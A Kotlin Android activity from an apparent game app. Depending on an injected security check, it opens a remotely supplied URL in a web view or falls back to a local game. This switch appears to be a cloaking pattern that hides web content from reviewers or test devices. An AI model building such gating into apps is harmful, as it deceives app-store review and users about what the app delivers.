package com.mobirate.rovercraft.gpla.ui.loading

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.mobirate.rovercraft.gpla.databinding.LoadingZeusBinding
import com.mobirate.rovercraft.gpla.ui.game.ZeusGame
import com.mobirate.rovercraft.gpla.ui.web.ZeusWeb
import com.mobirate.rovercraft.gpla.utils.Security
import com.mobirate.rovercraft.gpla.utils.ext.startNext
import com.mobirate.rovercraft.gpla.utils.ext.startNextWeb
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import org.koin.android.ext.android.inject
import org.koin.androidx.viewmodel.ext.android.viewModel

class ZeusLoading : AppCompatActivity() {
    private val loadingViewModel by viewModel<LoadingViewModel>()
    private val security: Security by inject()
    private lateinit var binding: LoadingZeusBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = LoadingZeusBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (security.secure) {
            val saved = runBlocking { loadingViewModel.isSaved().first() }
            lifecycleScope.launch {
                if (saved) {
                    startNextWeb<ZeusWeb>(loadingViewModel.getUrl().first())
                } else {
                    loadingViewModel.start()
                    loadingViewModel.url.collect { newUrl ->
                        if (newUrl.isNotEmpty())
                            startNextWeb<ZeusWeb>(newUrl)
                    }
                }
            }
        } else {
            startNext<ZeusGame>()
        }
    }
}